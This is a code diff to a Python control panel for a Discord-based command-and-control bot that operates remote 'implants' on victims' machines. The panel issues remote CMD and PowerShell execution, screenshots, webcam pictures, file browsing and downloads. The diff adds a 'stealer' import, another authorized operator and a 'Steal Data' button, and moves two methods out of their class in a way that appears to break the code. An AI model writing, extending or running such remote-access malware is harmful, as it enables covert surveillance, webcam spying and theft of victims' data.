@@ -8,9 +8,10 @@ from queue import Queue
 from PIL import Image
 import io
 import requests
+import stealer
 
 # --- Configuration ---
-TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470]
+TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470, 1385474310004670516]
 LIVE_SESSIONS_CATEGORY = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'; STREAM_FRAME_PREFIX = 'STREAM_FRAME:'
 
 # --- The C2 Bot that will run in the background ---
@@ -192,37 +193,54 @@ class ControlCenterUI(ctk.CTk):
         embed.add_field(name="Direct Frame URL", value="Waiting for first frame...", inline=False)
         self.bot_thread.bot.stream_display_message = await channel.send(embed=embed)
 
-    def setup_tabs(self):
-        exec_tab = self.tab_view.add("Execution"); exec_tab.grid_columnconfigure(0, weight=1)
-        cmd_entry = ctk.CTkEntry(exec_tab, placeholder_text="Enter CMD command..."); cmd_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
-        ctk.CTkButton(exec_tab, text="Run CMD", command=lambda: self.dispatch_command("runcmd", cmd_entry.get(), "Run CMD")).grid(row=0, column=1, padx=10, pady=5)
-        pwsh_entry = ctk.CTkEntry(exec_tab, placeholder_text="Enter PowerShell command..."); pwsh_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
-        ctk.CTkButton(exec_tab, text="Run PowerShell", command=lambda: self.dispatch_command("runpw", pwsh_entry.get(), "Run PowerShell")).grid(row=1, column=1, padx=10, pady=5)
-        system_tab = self.tab_view.add("System")
-        ctk.CTkButton(system_tab, text="Take Screenshot", command=lambda: self.dispatch_command("takescreenshot", friendly_name="Take Screenshot")).pack(pady=5, padx=10, fill="x")
-        ctk.CTkButton(system_tab, text="Take Webcam Picture", command=lambda: self.dispatch_command("irlpicture", friendly_name="Take Webcam Picture")).pack(pady=5, padx=10, fill="x")
-        ctk.CTkButton(system_tab, text="Get System Specs", command=lambda: self.dispatch_command("systemspecs", friendly_name="Get System Specs")).pack(pady=5, padx=10, fill="x")
-        ctk.CTkButton(system_tab, text="Kill Implant", command=lambda: self.dispatch_command("kill", friendly_name="Kill Implant"), fg_color="red", hover_color="darkred").pack(pady=5, padx=10, fill="x")
-        interact_tab = self.tab_view.add("Interaction"); interact_tab.grid_columnconfigure(0, weight=1)
-        url_entry = ctk.CTkEntry(interact_tab, placeholder_text="https://example.com"); url_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
-        ctk.CTkButton(interact_tab, text="Open Website", command=lambda: self.dispatch_command("openwebsite", url_entry.get(), "Open Website")).grid(row=0, column=1, padx=10, pady=5)
-        notif_title_entry = ctk.CTkEntry(interact_tab, placeholder_text="Notification Title"); notif_title_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
-        notif_msg_entry = ctk.CTkEntry(interact_tab, placeholder_text="Notification Message"); notif_msg_entry.grid(row=2, column=0, padx=10, pady=5, sticky="ew")
-        ctk.CTkButton(interact_tab, text="Show Notification", command=lambda: self.dispatch_command("shownotification", f'"{notif_title_entry.get()}" {notif_msg_entry.get()}', "Show Notification")).grid(row=1, rowspan=2, column=1, padx=10, pady=5, sticky="ns")
-        fs_tab = self.tab_view.add("File System"); fs_tab.grid_columnconfigure(0, weight=1)
-        explore_entry = ctk.CTkEntry(fs_tab, placeholder_text="C:\\Users (or leave blank)"); explore_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
-        ctk.CTkButton(fs_tab, text="Explore Path", command=lambda: self.dispatch_command("explore", explore_entry.get(), "Explore Path")).grid(row=0, column=1, padx=10, pady=5)
-        download_entry = ctk.CTkEntry(fs_tab, placeholder_text="C:\\path\\to\\file.txt on implant"); download_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
-        ctk.CTkButton(fs_tab, text="Download File", command=lambda: self.dispatch_command("download", download_entry.get(), "Download File")).grid(row=1, column=1, padx=10, pady=5)
-        settings_tab = self.tab_view.add("Settings")
-        self.beta_features_switch = ctk.CTkSwitch(settings_tab, text="Enable Beta Features", command=self.toggle_beta_features)
-        self.beta_features_switch.pack(pady=10, padx=20, anchor="w")
-        self.beta_frame = ctk.CTkFrame(settings_tab, fg_color="transparent"); self.beta_frame.pack(fill="both", expand=True, padx=10)
-        self.screenshare_button = ctk.CTkButton(self.beta_frame, text="Start Live Screenshare (Beta)", command=self.start_screenshare, fg_color="#6A5ACD", hover_color="#483D8B")
+def setup_tabs(self):
+    exec_tab = self.tab_view.add("Execution")
+    exec_tab.grid_columnconfigure(0, weight=1)
+    cmd_entry = ctk.CTkEntry(exec_tab, placeholder_text="Enter CMD command...")
+    cmd_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
+    ctk.CTkButton(exec_tab, text="Run CMD", command=lambda: self.dispatch_command("runcmd", cmd_entry.get(), "Run CMD")).grid(row=0, column=1, padx=10, pady=5)
+    pwsh_entry = ctk.CTkEntry(exec_tab, placeholder_text="Enter PowerShell command...")
+    pwsh_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
+    ctk.CTkButton(exec_tab, text="Run PowerShell", command=lambda: self.dispatch_command("runpw", pwsh_entry.get(), "Run PowerShell")).grid(row=1, column=1, padx=10, pady=5)
+    system_tab = self.tab_view.add("System")
+    ctk.CTkButton(system_tab, text="Take Screenshot", command=lambda: self.dispatch_command("takescreenshot", friendly_name="Take Screenshot")).pack(pady=5, padx=10, fill="x")
+    ctk.CTkButton(system_tab, text="Take Webcam Picture", command=lambda: self.dispatch_command("irlpicture", friendly_name="Take Webcam Picture")).pack(pady=5, padx=10, fill="x")
+    ctk.CTkButton(system_tab, text="Get System Specs", command=lambda: self.dispatch_command("systemspecs", friendly_name="Get System Specs")).pack(pady=5, padx=10, fill="x")
+    ctk.CTkButton(system_tab, text="Kill Implant", command=lambda: self.dispatch_command("kill", friendly_name="Kill Implant"), fg_color="red", hover_color="darkred").pack(pady=5, padx=10, fill="x")
+    interact_tab = self.tab_view.add("Interaction")
+    interact_tab.grid_columnconfigure(0, weight=1)
+    url_entry = ctk.CTkEntry(interact_tab, placeholder_text="https://example.com")
+    url_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
+    ctk.CTkButton(interact_tab, text="Open Website", command=lambda: self.dispatch_command("openwebsite", url_entry.get(), "Open Website")).grid(row=0, column=1, padx=10, pady=5)
+    notif_title_entry = ctk.CTkEntry(interact_tab, placeholder_text="Notification Title")
+    notif_title_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
+    notif_msg_entry = ctk.CTkEntry(interact_tab, placeholder_text="Notification Message")
+    notif_msg_entry.grid(row=2, column=0, padx=10, pady=5, sticky="ew")
+    ctk.CTkButton(interact_tab, text="Show Notification", command=lambda: self.dispatch_command("shownotification", f'"{notif_title_entry.get()}" {notif_msg_entry.get()}', "Show Notification")).grid(row=1, rowspan=2, column=1, padx=10, pady=5, sticky="ns")
+    fs_tab = self.tab_view.add("File System")
+    fs_tab.grid_columnconfigure(0, weight=1)
+    explore_entry = ctk.CTkEntry(fs_tab, placeholder_text="C:\\Users (or leave blank)")
+    explore_entry.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
+    ctk.CTkButton(fs_tab, text="Explore Path", command=lambda: self.dispatch_command("explore", explore_entry.get(), "Explore Path")).grid(row=0, column=1, padx=10, pady=5)
+    download_entry = ctk.CTkEntry(fs_tab, placeholder_text="C:\\path\\to\\file.txt on implant")
+    download_entry.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
+    ctk.CTkButton(fs_tab, text="Download File", command=lambda: self.dispatch_command("download", download_entry.get(), "Download File")).grid(row=1, column=1, padx=10, pady=5)
+    settings_tab = self.tab_view.add("Settings")
+    self.beta_features_switch = ctk.CTkSwitch(settings_tab, text="Enable Beta Features", command=self.toggle_beta_features)
+    self.beta_features_switch.pack(pady=10, padx=20, anchor="w")
+    self.beta_frame = ctk.CTkFrame(settings_tab, fg_color="transparent")
+    self.beta_frame.pack(fill="both", expand=True, padx=10)
+    self.screenshare_button = ctk.CTkButton(self.beta_frame, text="Start Live Screenshare (Beta)", command=self.start_screenshare, fg_color="#6A5ACD", hover_color="#483D8B")
+    self.steal_data_button = ctk.CTkButton(self.beta_frame, text="Steal Data (Beta)", command=lambda: self.dispatch_command("stealdata", friendly_name="Steal Data"), fg_color="red", hover_color="darkred")
+    self.steal_data_button.pack(pady=5, padx=10, anchor="w")
 
-    def toggle_beta_features(self):
-        if self.beta_features_switch.get() == 1: self.screenshare_button.pack(pady=5, padx=10, anchor="w")
-        else: self.screenshare_button.pack_forget()
+def toggle_beta_features(self):
+    if self.beta_features_switch.get() == 1:
+        self.screenshare_button.pack(pady=5, padx=10, anchor="w")
+        self.steal_data_button.pack(pady=5, padx=10, anchor="w")
+    else:
+        self.screenshare_button.pack_forget()
+        self.steal_data_button.pack_forget()
 
 if __name__ == "__main__":
     if not os.path.exists(TOKEN_PATH): print(f"FATAL: {TOKEN_PATH} not found!")
